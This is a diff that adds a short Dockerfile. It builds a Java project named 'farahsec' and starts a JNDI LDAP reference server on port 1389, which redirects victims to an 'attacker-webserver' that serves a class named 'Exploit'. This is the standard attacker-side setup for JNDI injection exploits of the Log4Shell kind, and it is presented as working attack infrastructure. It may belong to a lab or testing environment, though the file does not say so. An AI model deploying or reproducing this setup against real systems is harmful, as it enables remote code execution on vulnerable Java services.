@@ -1,0 +1,14 @@
+FROM maven:3.8-jdk-11
+EXPOSE 1389
+
+RUN mkdir /farahsec
+COPY farahsec/ /farahsec
+WORKDIR /farahsec
+RUN mvn package -DskipTests
+
+ENV HTTP_HOST=attacker-webserver
+ENV HTTP_PORT=8888
+ENV LDAP_PORT=1389
+
+# ✅ Chemin correct vers le JAR
+CMD ["sh", "-c", "java -cp /farahsec/target/farahsec-0.0.3-SNAPSHOT-all.jar farahsec.jndi.LDAPRefServer http://${HTTP_HOST}:${HTTP_PORT}/#Exploit ${LDAP_PORT}"]
